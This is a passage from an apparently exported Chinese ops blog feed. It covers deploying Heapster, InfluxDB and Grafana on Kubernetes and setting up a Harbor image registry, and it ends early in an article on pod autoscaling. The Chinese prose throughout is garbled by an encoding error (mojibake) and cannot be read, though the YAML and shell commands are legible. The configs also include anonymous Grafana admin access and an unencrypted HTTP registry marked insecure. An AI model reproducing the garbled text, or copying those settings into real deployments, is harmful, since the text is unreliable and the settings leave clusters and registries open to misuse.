å…¶ä¸­rbacä¸éœ€è¦åšè°ƒæ•´ç­‰ä¸‹å¯ä»¥ç›´æ¥ä½¿ç”¨, rabc.yamlæ–‡ä»¶å†…å®¹å¦‚ä¸‹:123456789101112kind: ClusterRoleBindingapiVersion: rbac.authorization.k8s.io/v1beta1metadata: name: heapsterroleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: system:heapstersubjects:- kind: ServiceAccount name: heapster namespace: kube-system heapster.yaml: æ³¨æ„ä¿®æ”¹é•œåƒåœ°å€ä¸ºä½ ç§æœ‰ä»“åº“åœ°å€1234567891011121314151617181920212223242526272829303132333435363738394041424344454647apiVersion: v1kind: ServiceAccountmetadata: name: heapster namespace: kube-system---apiVersion: extensions/v1beta1kind: Deploymentmetadata: name: heapster namespace: kube-systemspec: replicas: 1 template: metadata: labels: task: monitoring k8s-app: heapster spec: serviceAccountName: heapster containers: - name: heapster image: 192.168.204.15/kubernetes/heapster-amd64:v1.5.0 imagePullPolicy: IfNotPresent command: - /heapster - --source=kubernetes.summary_api:https://kubernetes.default - --sink=influxdb:http://monitoring-influxdb.kube-system.svc:8086---apiVersion: v1kind: Servicemetadata: labels: task: monitoring # For use as a Cluster add-on (https://github.com/kubernetes/kubernetes/tree/master/cluster/addons) # If you are NOT using this as an addon, you should comment out this line. kubernetes.io/cluster-service: 'true' kubernetes.io/name: Heapster name: heapster namespace: kube-systemspec: type: NodePort ports: - port: 80 targetPort: 8082 selector: k8s-app: heapster å®˜æ–¹æä¾›1.4.2, ä½†æ˜¯addonç»„ä»¶å·²ç»ä½¿ç”¨åˆ°äº†1.5.0, å› æ­¤è¿™é‡Œä½¿ç”¨1.5.0ç‰ˆæœ¬çš„heapster kubernetes.summary_api ä½¿ç”¨æ‰¹é‡é‡‡é›†çš„æ¨¡å¼, è¿™ä¹Ÿæ˜¯æ¨èæ¨¡å¼, ç”±äºä¸çŸ¥é“æ˜¯å¦é»˜è®¤å¼€å¯, è¿™é‡Œæ‰‹åŠ¨æŒ‡å®šä¸‹ influxdb.yaml: åŒæ ·éœ€è¦ä¿®æ”¹é•œåƒåœ°å€, å…¶ä»–æ— éœ€ä¿®æ”¹1234567891011121314151617181920212223242526272829303132333435363738394041apiVersion: extensions/v1beta1kind: Deploymentmetadata: name: monitoring-influxdb namespace: kube-systemspec: replicas: 1 template: metadata: labels: task: monitoring k8s-app: influxdb spec: containers: - name: influxdb image: 192.168.204.15/kubernetes/heapster-influxdb:v1.3.3 volumeMounts: - mountPath: /data name: influxdb-storage volumes: - name: influxdb-storage emptyDir: &#123;&#125;---apiVersion: v1kind: Servicemetadata: labels: task: monitoring # For use as a Cluster add-on (https://github.com/kubernetes/kubernetes/tree/master/cluster/addons) # If you are NOT using this as an addon, you should comment out this line. kubernetes.io/cluster-service: 'true' kubernetes.io/name: monitoring-influxdb name: monitoring-influxdb namespace: kube-systemspec: type: NodePort ports: - port: 8086 targetPort: 8086 selector: k8s-app: influxdb grafana.yaml: åŒæ ·éœ€è¦ä¿®æ”¹é•œåƒåœ°å€, å…¶ä»–æ— éœ€ä¿®æ”¹123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172apiVersion: extensions/v1beta1kind: Deploymentmetadata: name: monitoring-grafana namespace: kube-systemspec: replicas: 1 template: metadata: labels: task: monitoring k8s-app: grafana spec: containers: - name: grafana image: 192.168.204.15/kubernetes/heapster-grafana:v4.4.3 ports: - containerPort: 3000 protocol: TCP volumeMounts: - mountPath: /etc/ssl/certs name: ca-certificates readOnly: true - mountPath: /var name: grafana-storage env: - name: INFLUXDB_HOST value: monitoring-influxdb - name: GF_SERVER_HTTP_PORT value: &quot;3000&quot; # The following env variables are required to make Grafana accessible via # the kubernetes api-server proxy. On production clusters, we recommend # removing these env variables, setup auth for grafana, and expose the grafana # service using a LoadBalancer or a public IP. - name: GF_AUTH_BASIC_ENABLED value: &quot;false&quot; - name: GF_AUTH_ANONYMOUS_ENABLED value: &quot;true&quot; - name: GF_AUTH_ANONYMOUS_ORG_ROLE value: Admin - name: GF_SERVER_ROOT_URL # If you&apos;re only using the API Server proxy, set this value instead: # value: /api/v1/namespaces/kube-system/services/monitoring-grafana/proxy value: / volumes: - name: ca-certificates hostPath: path: /etc/ssl/certs - name: grafana-storage emptyDir: &#123;&#125;---apiVersion: v1kind: Servicemetadata: labels: # For use as a Cluster add-on (https://github.com/kubernetes/kubernetes/tree/master/cluster/addons) # If you are NOT using this as an addon, you should comment out this line. kubernetes.io/cluster-service: &apos;true&apos; kubernetes.io/name: monitoring-grafana name: monitoring-grafana namespace: kube-systemspec: # In a production setup, we recommend accessing Grafana through an external Loadbalancer # or through a public IP. # type: LoadBalancer # You could also use NodePort to expose the service at a randomly-generated port type: NodePort ports: - port: 80 targetPort: 3000 selector: k8s-app: grafana ç„¶åå¯åŠ¨heapster123[root@k8s-apiserver01 heapster]# lsgrafana.yaml heapster-rbac.yaml heapster.yaml influxdb.yaml[root@k8s-apiserver01 heapster]# kubectl create -f . éªŒè¯heapsteræœåŠ¡æ˜¯å¦å¯åŠ¨æˆåŠŸ:1234567891011121314151617181920[root@k8s-apiserver01 heapster]# kubectl get svc -n kube-systemNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEheapster NodePort 10.254.67.244 &lt;none&gt; 80:31408/TCP 1dkube-dns ClusterIP 10.254.0.2 &lt;none&gt; 53/UDP,53/TCP 2dkubernetes-dashboard NodePort 10.254.227.210 &lt;none&gt; 443:31580/TCP 2dmonitoring-grafana NodePort 10.254.168.229 &lt;none&gt; 80:31708/TCP 1dmonitoring-influxdb NodePort 10.254.245.244 &lt;none&gt; 8086:31609/TCP 1d[root@k8s-apiserver01 heapster]# kubectl get pods -n kube-systemNAME READY STATUS RESTARTS AGEcalico-kube-controllers-76ddc77958-pc7t2 1/1 Running 1 2dcalico-node-4jr45 2/2 Running 2 2dcalico-node-5cvkj 2/2 Running 0 1dcalico-node-sllgc 2/2 Running 0 2dcalico-node-xwf7g 2/2 Running 2 2dcoredns-79959c7b7f-b4jtw 1/1 Running 0 2dcoredns-79959c7b7f-ghl79 1/1 Running 1 2dheapster-79985cdc9f-j6m42 1/1 Running 0 1dkubernetes-dashboard-79bb795c55-x2mkx 1/1 Running 1 2dmonitoring-grafana-bfbb54ddb-nn7wg 1/1 Running 0 1dmonitoring-influxdb-75f476dc7b-cv5t8 1/1 Running 0 1d æœ€åé€šè¿‡kubectl logsæŸ¥çœ‹å¯åŠ¨æ—¥å¿—, æˆ–è€…é€šè¿‡dashboardæŸ¥çœ‹å®¹å™¨æ—¥å¿—, ç¡®ä¿æ²¡æœ‰æŠ¥é”™ã€‚è¿™heapsteréƒ¨ç½²æˆåŠŸ æ³¨æ„: ç”±äºheapsteréœ€è¦æœåŠ¡nodeèŠ‚ç‚¹çš„kubeletæœåŠ¡(å…¶å®æ˜¯cadviser), å› æ­¤calicoåœ¨éƒ¨ç½²çš„æ—¶å€™éœ€è¦å¼€å¯å®¹å™¨å†…éƒ¨ç½‘ç»œå’Œnodeç½‘ç»œçš„é€šä¿¡, calicoå¯åŠ¨çš„FELIX_DEFAULTENDPOINTTOHOSTACTIONç¯å¢ƒå˜é‡è®¾ç½®ä¸ºACCEPTåˆ™è¡¨ç¤ºå¼€å§‹, ä½†æ˜¯å…è®¸å®¹å™¨ç½‘ç»œå’Œnodeç½‘ç»œäº’é€šæ˜¯å¾ˆå±é™©çš„, è€Œä¸”å³ä½¿æˆ‘å¼€å§‹äº†ä¹Ÿæ²¡é€š:ç”±äºcalicoä½¿ç”¨çš„æ˜¯bgpçš„æ–¹æ¡ˆ, è€Œæˆ‘çš„ç¯å¢ƒæ˜¯åŸºäºOpenstackçš„è™šæ‹Ÿæœº, åœ¨IaaSå±‚, openstack neutroç½‘ç»œæ˜¯ä¸å…è®¸éneutroåˆ†é…çš„IPåœ°å€ç›´æ¥å‡ºå»çš„, å› æ­¤æˆ‘æ‰¾åˆ°heapsteræ‰€æœ‰å®¹å™¨çš„ä¸»æœº, ä½¿ç”¨ä¸€æ¡SNATè§„åˆ™, è®©heapsteræ‰€åœ¨çš„nodeä»£ç†å…¶è®¿é—®nodeèŠ‚ç‚¹æ‰€åœ¨ç½‘ç»œã€‚, å¦‚æœä½ IaaSå±‚æ²¡æœ‰é™åˆ¶, è¿™æ— éœ€è¿›è¡Œä¸‹é¢çš„SNATæ“ä½œ:1234# å…è®¸heapsteræ‰€æœ‰ç½‘ç»œ è®¿é—® nodeç½‘ç»œ, é€šè¿‡nodeä¸ºä»£ç†iptables -t nat -A POSTROUTING -s 192.168.135.0/24 -d 192.168.204.0/24 -j SNAT --to-source 192.168.204.7[root@k8s-node03 ~]# iptables -t nat -L -nv | grep SNAT 7 468 SNAT all -- * * 192.168.135.0/24 192.168.204.0/24 to:192.168.204.7 éªŒè¯heapsteræˆåŠŸéƒ¨ç½²å, è¿›è¡ŒéªŒè¯: heapsteræœåŠ¡éªŒè¯: æ‰¾åˆ°heapsteræœåŠ¡çš„å†…éƒ¨IP, ç„¶ååœ¨å¯åŠ¨ä¸€ä¸ªcontainerè®¿é—®heapsteræœåŠ¡ip, å¦‚æœæ­£å¸¸è¯´æ˜heapsterå·¥ä½œæ­£å¸¸: topå‘½ä»¤å·¥ä½œæ­£å¸¸: 123456[root@k8s-apiserver01 heapster]# kubectl top nodesNAME CPU(cores) CPU% MEMORY(bytes) MEMORY%192.168.204.4 1929m 96% 1698Mi 46%192.168.204.6 1981m 99% 1822Mi 49%192.168.204.7 1274m 63% 1564Mi 42%192.168.204.3 1286m 64% 2034Mi 55% è®¿é—®grafana: grafanaé€šè¿‡nodePortå¯¼å‡ºå, ç›´æ¥é€šè¿‡NodeIPè¿›è¡Œè®¿é—®, å·¥ä½œæ­£å¸¸å¦‚ä¸‹å›¾: dashboardä¸Šå¯ä»¥çœ‹åˆ°ç›¸å…³metriçš„å›¾è¡¨å±•ç¤ºäº†: å‚è€ƒ calico install documentation cni github coreDNS deploy kubernetes-dashboard github kubernetes-dashborad create sample user kubernetes-heapster heapster influxdb backend installation]]></content>
      <categories>
        <category>è¿ç»´</category>
        <category>kubernetes</category>
      </categories>
      <tags>
        <tag>kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¼ä¸šçº§Dockeré•œåƒä»“åº“harborçš„éƒ¨ç½²å’Œä½¿ç”¨]]></title>
    <url>%2F2018%2F01%2F23%2Fharbor%2F</url>
    <content type="text"><![CDATA[éƒ¨ç½²ä¼ä¸šç§æœ‰ä»“åº“å¾€å¾€æ˜¯å¾ˆæœ‰å¿…è¦çš„, ä»–å¯ä»¥å¸®åŠ©ä½ ç®¡ç†ä¼ä¸šçš„ä¸€äº›æ•æ„Ÿé•œåƒ, åŒæ—¶ç”±äºDocker Hubçš„ä¸‹è½½é€Ÿåº¦å’ŒGFWçš„åŸå› , å¾€å¾€éœ€è¦å°†ä¸€äº›æ— æ³•ç›´æ¥ä¸‹è½½çš„é•œåƒå¯¼å…¥æœ¬åœ°ç§æœ‰ä»“åº“. è€ŒHarborå°±æ˜¯éƒ¨ç½²ä¼ä¸šç§æœ‰ä»“åº“çš„ä¸€ä¸ªä¸äºŒä¹‹é€‰ã€‚ Harbarç®€ä»‹Harboræ˜¯VMwareå…¬å¸å¼€æºäº†ä¼ä¸šçº§Registryé¡¹ç›®, å…¶çš„ç›®æ ‡æ˜¯å¸®åŠ©ç”¨æˆ·è¿…é€Ÿæ­å»ºä¸€ä¸ªä¼ä¸šçº§çš„Docker registryæœåŠ¡ã€‚å®ƒä»¥Dockerå…¬å¸å¼€æºçš„registryä¸ºåŸºç¡€ï¼Œé¢å¤–æä¾›äº†å¦‚ä¸‹åŠŸèƒ½: åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶(Role Based Access Control) åŸºäºç­–ç•¥çš„é•œåƒå¤åˆ¶(Policy based image replication) é•œåƒçš„æ¼æ´æ‰«æ(Vulnerability Scanning) AD/LDAPé›†æˆ(LDAP/AD support) é•œåƒçš„åˆ é™¤å’Œç©ºé—´æ¸…ç†(Image deletion &amp; garbage collection) å‹å¥½çš„ç®¡ç†UI(Graphical user portal) å®¡è®¡æ—¥å¿—(Audit logging) RESTful API éƒ¨ç½²ç®€å•(Easy deployment) æ¶æ„ä»‹ç»è¿™é‡Œå€Ÿç”¨åˆ«äººä¸€å¼ å›¾: Harborä¾èµ–çš„å¤–éƒ¨ç»„ä»¶: Nginx(Proxy): Harborçš„registry,UI,tokenç­‰æœåŠ¡ï¼Œé€šè¿‡ä¸€ä¸ªå‰ç½®çš„åå‘ä»£ç†ç»Ÿä¸€æ¥æ”¶æµè§ˆå™¨ã€Dockerå®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå¹¶å°†è¯·æ±‚è½¬å‘ç»™åç«¯ä¸åŒçš„æœåŠ¡ã€‚ Registry v2: Dockerå®˜æ–¹é•œåƒä»“åº“, è´Ÿè´£å‚¨å­˜Dockeré•œåƒï¼Œå¹¶å¤„ç†docker push/pullå‘½ä»¤ã€‚ç”±äºæˆ‘ä»¬è¦å¯¹ç”¨æˆ·è¿›è¡Œè®¿é—®æ§åˆ¶ï¼Œå³ä¸åŒç”¨æˆ·å¯¹Docker imageæœ‰ä¸åŒçš„è¯»å†™æƒé™ï¼ŒRegistryä¼šæŒ‡å‘ä¸€ä¸ªtokenæœåŠ¡ï¼Œå¼ºåˆ¶ç”¨æˆ·çš„æ¯æ¬¡docker pull/pushè¯·æ±‚éƒ½è¦æºå¸¦ä¸€ä¸ªåˆæ³•çš„token, Registryä¼šé€šè¿‡å…¬é’¥å¯¹tokenè¿›è¡Œè§£å¯†éªŒè¯ã€‚ Database(MySQL)ï¼šä¸ºcore servicesæä¾›æ•°æ®åº“æœåŠ¡ï¼Œè´Ÿè´£å‚¨å­˜ç”¨æˆ·æƒé™ã€å®¡è®¡æ—¥å¿—ã€Docker imageåˆ†ç»„ä¿¡æ¯ç­‰æ•°æ®ã€‚ Harborè‡ªå·±ç»„ä»¶: Core services(Admin Server): è¿™æ˜¯Harborçš„æ ¸å¿ƒåŠŸèƒ½ï¼Œä¸»è¦æä¾›ä»¥ä¸‹æœåŠ¡ï¼š UIï¼šæä¾›å›¾å½¢åŒ–ç•Œé¢ï¼Œå¸®åŠ©ç”¨æˆ·ç®¡ç†registryä¸Šçš„é•œåƒï¼ˆimageï¼‰, å¹¶å¯¹ç”¨æˆ·è¿›è¡Œæˆæƒã€‚ webhookï¼šä¸ºäº†åŠæ—¶è·å–registry ä¸ŠimageçŠ¶æ€å˜åŒ–çš„æƒ…å†µï¼Œ åœ¨Registryä¸Šé…ç½®webhookï¼ŒæŠŠçŠ¶æ€å˜åŒ–ä¼ é€’ç»™UIæ¨¡å—ã€‚ AuthæœåŠ¡ï¼šè´Ÿè´£æ ¹æ®ç”¨æˆ·æƒé™ç»™æ¯ä¸ªdocker push/pullå‘½ä»¤ç­¾å‘token. Docker å®¢æˆ·ç«¯å‘RegiÃ¸stryæœåŠ¡å‘èµ·çš„è¯·æ±‚,å¦‚æœä¸åŒ…å«tokenï¼Œä¼šè¢«é‡å®šå‘åˆ°è¿™é‡Œï¼Œè·å¾—tokenåå†é‡æ–°å‘Registryè¿›è¡Œè¯·æ±‚ã€‚ API: æä¾›Harbor RESTful API Replication Job Serviceï¼šæä¾›å¤šä¸ª Harbor å®ä¾‹ä¹‹é—´çš„é•œåƒåŒæ­¥åŠŸèƒ½ã€‚ Log collectorï¼šä¸ºäº†å¸®åŠ©ç›‘æ§Harborè¿è¡Œï¼Œè´Ÿè´£æ”¶é›†å…¶ä»–ç»„ä»¶çš„logï¼Œä¾›æ—¥åè¿›è¡Œåˆ†æã€‚ éƒ¨ç½²è¿™é‡Œä¸ä½¿ç”¨kubernetesæ¥éƒ¨ç½², åŸå› æ˜¯é•œåƒä»“åº“éå¸¸é‡è¦, å°½é‡ä¿è¯éƒ¨ç½²å’Œç»´æŠ¤çš„ç®€æ´æ€§, å› æ­¤è¿™é‡Œç›´æ¥ä½¿ç”¨composeçš„æ–¹å¼è¿›è¡Œéƒ¨ç½²ã€‚å®˜æ–¹æä¾›3ç§éƒ¨ç½²Harborçš„æ–¹å¼: åœ¨çº¿å®‰è£…: ä»Docker Hubä¸‹è½½Harborçš„é•œåƒæ¥å®‰è£…, ç”±äºDocker Hubæ¯”è¾ƒæ…¢, å»ºè®®Dockeré…ç½®å¥½åŠ é€Ÿå™¨ã€‚ ç¦»çº¿å®‰è£…: è¿™ç§æ–¹å¼åº”å¯¹ä¸éƒ¨ç½²ä¸»æœºæ²¡è”ç½‘çš„æƒ…å†µä½¿ç”¨ã€‚éœ€è¦æå‰ä¸‹è½½ç¦»çº¿å®‰è£…åŒ…: harbor-offline-installer-.tgz åˆ°æœ¬åœ° OVAå®‰è£…: è¿™ä¸ªä¸»è¦ç”¨vCentorç¯å¢ƒæ˜¯ä½¿ç”¨ åé¢éƒ¨ç½²æ—¶ä¼šä¸ºDockeré…ç½®é•œåƒåŠ é€Ÿå™¨, å› æ­¤ä¼šé‡‡ç”¨åœ¨çº¿éƒ¨ç½²çš„æ–¹å¼, éƒ¨ç½²æ­¥éª¤å¦‚ä¸‹: ä¸‹è½½Harboræœ€æ–°çš„åœ¨çº¿å®‰è£…åŒ… é…ç½®Harbor(harbor.cfg) è¿è¡Œinstall.shæ¥å®‰è£…å’Œå¯åŠ¨Harbor ç¯å¢ƒè¦æ±‚ä¸å‡†å¤‡Harborä»¥å®¹å™¨çš„å½¢å¼è¿›è¡Œéƒ¨ç½², å› æ­¤å¯ä»¥è¢«éƒ¨ç½²åˆ°ä»»ä½•æ”¯æŒDockerçš„Linuxå‘è¡Œç‰ˆ, å¹¶ä¸”å…·å¤‡å¦‚ä¸‹ç¯å¢ƒ: Python2.7+ Docker Engine 1.10+ Docker Compose 1.6.0+ è¿™é‡Œä½¿ç”¨CentOS7.3çš„ç³»ç»Ÿ, Python2.7ç³»ç»Ÿè‡ªå¸¦äº†, å‰©ä¸‹çš„å°±æ˜¯å®‰è£…Dockerå’ŒCompose:1234567891011121314151617[root@harbor01 ~]# yum install docker -y[root@harbor01 ~]# yum -y install epel-release[root@harbor01 ~]# yum install python-pip -y[root@harbor01 ~]# pip install docker-compose# æŸ¥çœ‹å®‰è£…å®Œæˆçš„Dockerå’ŒComposeçš„ç‰ˆæœ¬[root@harbor01 ~]# docker versionClient: Version: 1.12.6 API version: 1.24 Package version: docker-1.12.6-68.gitec8512b.el7.centos.x86_64 Go version: go1.8.3 Git commit: ec8512b/1.12.6 Built: Mon Dec 11 16:08:42 2017 OS/Arch: linux/amd64Cannot connect to the Docker daemon. Is the docker daemon running on this host?[root@harbor01 ~]# pip freeze | grep composedocker-compose==1.18.0 ä¸ºDockeré…ç½®åŠ é€Ÿå™¨, æ–¹ä¾¿é€šè¿‡å›½å†…é•œåƒæœåŠ¡å™¨å¿«é€Ÿæ‹‰å–Docker Hubæä¾›çš„é•œåƒ123456789mkdir -p /etc/dockertee /etc/docker/daemon.json &lt;&lt;-'EOF'&#123; "registry-mirrors": ["https://v5d7kh0f.mirror.aliyuncs.com"]&#125;EOFsystemctl enable dockersystemctl start dockersystemctl status docker ä¸‹è½½å®‰è£…åŒ…åˆ°Harborçš„GitHubä»“åº“çš„Releaseé¡µé¢, ä¸‹è½½æœ€æ–°çš„åœ¨çº¿å®‰è£…åŒ…(å¦‚æœä¸‹è½½ä¸äº†, è¯·ä»è¿™é‡Œä¸‹è½½ç™¾åº¦ç½‘ç›˜Harborå®‰è£…åŒ…:12[root@harbor01 ~]# wget https://storage.googleapis.com/harbor-releases/harbor-online-installer-v1.3.0.tgz[root@harbor01 ~]# tar vxf harbor-online-installer-v1.3.0.tgz é…ç½®Harboråœ¨åˆšæ‰è§£å‹å®Œçš„ç›®å½•ä¸‹æœ‰harboré…ç½®æ–‡ä»¶: harbor.cfg, è¿™é‡Œæœ‰å‡ å¤„å¿…è¦é…ç½®éœ€è¦ä¿®æ”¹: hostname: ä¿®æ”¹æˆä½ æœ¬æœºçš„ipåœ°å€ db_password: æ•°æ®åº“rootå¯†ç  harbor_admin_password: harboråˆå§‹ç®¡ç†å‘˜å¯†ç ä¸ºHarbor12345, è¿™é‡Œæœ€å¥½ä¿®æ”¹æˆè‡ªå·±çš„å…¶ä»–è¯¦ç»†çš„å‚æ•°è¯·æŸ¥çœ‹Harborå®˜æ–¹æ–‡æ¡£(è§å‚è€ƒ) å¯åŠ¨Harborè§£å‹å®Œè¿‡åå†harborç›®å½•ä¸‹æœ‰ä¸€ä¸ªinstall.sh, æ‰§è¡Œå®ƒæ¥è¿›è¡Œå®‰è£…1234567891011[root@harbor01 harbor]# ./install.sh[root@harbor01 harbor]# docker-compose ps Name Command State Ports------------------------------------------------------------------------------------------------------------------------------harbor-adminserver /harbor/start.sh Upharbor-db /usr/local/bin/docker-entr ... Up 3306/tcpharbor-jobservice /harbor/start.sh Upharbor-log /bin/sh -c /usr/local/bin/ ... Up 127.0.0.1:1514-&gt;10514/tcpharbor-ui /harbor/start.sh Upnginx nginx -g daemon off; Up 0.0.0.0:443-&gt;443/tcp, 0.0.0.0:4443-&gt;4443/tcp, 0.0.0.0:80-&gt;80/tcpregistry /entrypoint.sh serve /etc/ ... Up 5000/tcp ç„¶åè®¿é—®: ä½¿ç”¨æœåŠ¡å®‰è£…å¥½äº†è¿‡å, ä¸‹é¢ä»‹ç»å¦‚ä½•é€šè¿‡Docker Clientä½¿ç”¨Harbor é…ç½®dockerå®¢æˆ·ç«¯ä½¿ç”¨Harborå› ä¸ºHarborå¼€å¯çš„æ˜¯HTTPæœåŠ¡, è€Œä¸æ˜¯HTTPS, æ‰€ä»¥è¦ä¿®æ”¹ä¸‹Dockerçš„é…ç½®:/etc/docker/daemon.json, æ·»åŠ å‚æ•°insecure-registries:12345[root@harbor01 ~]# cat /etc/docker/daemon.json&#123; "registry-mirrors": ["https://v5d7kh0f.mirror.aliyuncs.com"], "insecure-registries": ["192.168.204.15"]&#125; ä¿®æ”¹è¿‡åé‡å¯docker, ç„¶åé‡å¯HarboræœåŠ¡:12345678910111213141516[root@harbor01 harbor]# systemctl restart docker[root@harbor01 harbor]# docker-compose stopStopping harbor-jobservice ... doneStopping harbor-ui ... doneStopping harbor-db ... doneStopping registry ... doneStopping harbor-adminserver ... doneStopping harbor-log ... done[root@harbor01 harbor]# docker-compose startStarting log ... doneStarting adminserver ... doneStarting registry ... doneStarting ui ... doneStarting mysql ... doneStarting jobservice ... doneStarting proxy ... done é•œåƒçš„Pushå’ŒPullä¸ºäº†ä½¿ç”¨Harboræˆ‘ä»¬éœ€è¦åœ¨Harborä¸Šå»ºç«‹ä¸€ä¸ªé¡¹ç›®:kubernetesæ³¨æ„: ä¸€å®šè¦å…ˆæœ‰é¡¹ç›® ç„¶åæŒ‰ç…§192.168.204.15/{project-name}/{image-name}[:Tag] çš„æ–¹å¼æ‰“Tag å»ºå¥½é¡¹ç›®å, æˆ‘ä»¬å…ˆæµ‹è¯•ä¸‹èƒ½å¦Login Harbor 1234[root@harbor01 harbor]# docker login 192.168.204.15Username: adminPassword:Login Succeeded ç„¶åä¸ºæˆ‘ä»¬çš„é•œåƒæ‰“ä¸Šç›¸åº”çš„æ ‡ç­¾, æ³¨æ„æ ‡ç­¾æ ¼å¼: 192.168.204.15/{project-name}/{image-name}[:Tag] 1234567[root@harbor01 ~]# docker tag docker.io/nginx:latest 192.168.204.15/kubernetes/nginx:v1.10[root@harbor01 ~]# docker push 192.168.204.15/kubernetes/nginx:v1.10The push refers to a repository [192.168.204.15/kubernetes/nginx]a103d141fc98: Pushed73e2bd445514: Pushed2ec5c0a4cb57: Pushedv1.10: digest: sha256:926b086e1234b6ae9a11589c4cece66b267890d24d1da388c96dd8795b2ffcfb size: 948 æœ€ååœ¨å¦ä¸€å°æœºå™¨ä¸Šé¢æ‹‰å–é•œåƒ(è®°å¾—é…ç½®Dockerå®¢æˆ·ç«¯insecure-registrieså‚æ•°, å‚è€ƒä¸Šé¢): 1234567~/Blogs Â» docker pull 192.168.204.15/kubernetes/nginx:v1.10 v1.10: Pulling from kubernetes/nginxe7bb522d92ff: Pull complete6edc05228666: Pull completecd866a17e81f: Pull completeDigest: sha256:926b086e1234b6ae9a11589c4cece66b267890d24d1da388c96dd8795b2ffcfbStatus: Downloaded newer image for 192.168.204.15/kubernetes/nginx:v1.10 å‚è€ƒ Harbor GitHub Harbor å®‰è£…æ‰‹å†Œ Harbor ç”¨æˆ·æ‰‹å†Œ ç”¨ Harbor å’Œ Kubernetes æ„å»ºé«˜å¯ç”¨ä¼ä¸šçº§é•œåƒä»“åº“]]></content>
      <categories>
        <category>è¿ç»´</category>
        <category>kubernetes</category>
      </categories>
      <tags>
        <tag>harbor</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¦‚ä½•åˆ©ç”¨kuberneteså®ç°åº”ç”¨çš„æ°´å¹³æ‰©å±•(HPA)]]></title>
    <url>%2F2018%2F01%2F22%2Fkubernetes-hpa%2F</url>
    <content type="text"><![CDATA[äº‘è®¡ç®—å…·æœ‰æ°´å¹³å¼¹æ€§çš„ç‰¹æ€§ï¼Œè¿™ä¸ªæ˜¯äº‘è®¡ç®—åŒºåˆ«äºä¼ ç»ŸITæŠ€æœ¯æ¶æ„çš„ä¸»è¦ç‰¹æ€§ã€‚å¯¹äºKubernetesä¸­çš„PODé›†ç¾¤æ¥è¯´ï¼ŒHPAå°±æ˜¯å®ç°è¿™ç§æ°´å¹³ä¼¸ç¼©çš„æ§åˆ¶å™¨, å®ƒèƒ½åœ¨å½“PODä¸­ä¸šåŠ¡è´Ÿè½½ä¸Šå‡çš„æ—¶å€™ï¼Œåˆ›å»ºæ–°çš„PODæ¥ä¿è¯ä¸šåŠ¡ç³»ç»Ÿç¨³å®šè¿è¡Œï¼Œå½“PODä¸­ä¸šåŠ¡è´Ÿè½½ä¸‹é™çš„æ—¶å€™ï¼Œå¯ä»¥é”€æ¯PODæ¥æé«˜èµ„æºåˆ©ç”¨ç‡ã€‚ HPAä»‹ç»Horizontal Pod Autoscalingï¼Œç®€ç§°HPAï¼Œæ˜¯Kubernetesä¸­å®ç°PODæ°´å¹³è‡ªåŠ¨ä¼¸ç¼©çš„åŠŸèƒ½ã€‚ä¸ºä»€ä¹ˆè¦æ°´å¹³è€Œä¸å«å‚ç›´, é‚£æ˜¯å› ä¸ºè‡ªåŠ¨æ‰©å±•ä¸»è¦åˆ†ä¸ºä¸¤ç§: æ°´å¹³æ‰©å±•(scale out)ï¼Œé’ˆå¯¹äºå®ä¾‹æ•°ç›®çš„å¢å‡ å‚ç›´æ‰©å±•(scal up)ï¼Œå³å•ä¸ªå®ä¾‹å¯ä»¥ä½¿ç”¨çš„èµ„æºçš„å¢å‡, æ¯”å¦‚å¢åŠ cpuå’Œå¢å¤§å†…å­˜è€ŒHPAå±äºå‰è€…ã€‚å®ƒå¯ä»¥æ ¹æ®CPUä½¿ç”¨ç‡æˆ–åº”ç”¨è‡ªå®šä¹‰metricsè‡ªåŠ¨æ‰©å±•Podæ•°é‡(æ”¯æŒ replication controllerã€deployment å’Œ replica set) æ¶æ„ä»‹ç»è·å–metricsçš„ä¸¤ç§æ–¹å¼: Heapster: heapsteræä¾›metricsæœåŠ¡, ä½†æ˜¯åœ¨v1(autoscaling/v1)ç‰ˆæœ¬ä¸­ä»…æ”¯æŒä»¥CPUä½œä¸ºæ‰©å±•åº¦é‡æŒ‡æ ‡, è€Œå…¶ä»–æ¯”å¦‚:å†…å­˜, ç½‘ç»œæµé‡, qpsç­‰ç›®å‰å¤„äºbetaé˜¶æ®µ(autoscaling/v2beta1) Cousom: åŒæ ·å¤„äºbetaé˜¶æ®µ(autoscaling/v2beta1), ä½†æ˜¯æ¶‰åŠåˆ°è‡ªå®šä¹‰çš„REST APIçš„å¼€å‘, å¤æ‚åº¦ä¼šå¤§ä¸€äº›, å¹¶ä¸”å½“éœ€è¦ä»è‡ªå®šä¹‰çš„ç›‘æ§ä¸­è·å–æ•°æ®æ—¶ï¼Œåªèƒ½è®¾ç½®ç»å¯¹å€¼ï¼Œæ— æ³•è®¾ç½®ä½¿ç”¨ç‡ å·¥ä½œæµç¨‹: 1.åˆ›å»ºHPAèµ„æºï¼Œè®¾å®šç›®æ ‡CPUä½¿ç”¨ç‡é™é¢ï¼Œä»¥åŠæœ€å¤§ã€æœ€å°å®ä¾‹æ•°, ä¸€å®šè¦è®¾ç½®Podçš„èµ„æºé™åˆ¶å‚æ•°: request, è´Ÿè´£HPAä¸ä¼šå·¥ä½œã€‚ 2.æ§åˆ¶ç®¡ç†å™¨æ¯éš”30s(å¯ä»¥é€šè¿‡â€“horizontal-pod-autoscaler-sync-periodä¿®æ”¹)æŸ¥è¯¢metricsçš„èµ„æºä½¿ç”¨æƒ…å†µ 3.ç„¶åä¸åˆ›å»ºæ—¶è®¾å®šçš„å€¼å’ŒæŒ‡æ ‡åšå¯¹æ¯”(å¹³å‡å€¼ä¹‹å’Œ/é™é¢)ï¼Œæ±‚å‡ºç›®æ ‡è°ƒæ•´çš„å®ä¾‹ä¸ªæ•° 4.ç›®æ ‡è°ƒæ•´çš„å®ä¾‹æ•°ä¸èƒ½è¶…è¿‡1ä¸­è®¾å®šçš„æœ€å¤§ã€æœ€å°å®ä¾‹æ•°ï¼Œå¦‚æœæ²¡æœ‰è¶…è¿‡ï¼Œåˆ™æ‰©å®¹ï¼›è¶…è¿‡ï¼Œåˆ™æ‰©å®¹è‡³æœ€å¤§çš„å®ä¾‹ä¸ªæ•° é‡å¤2-4æ­¥ è‡ªåŠ¨ä¼¸ç¼©ç®—æ³•:HPA 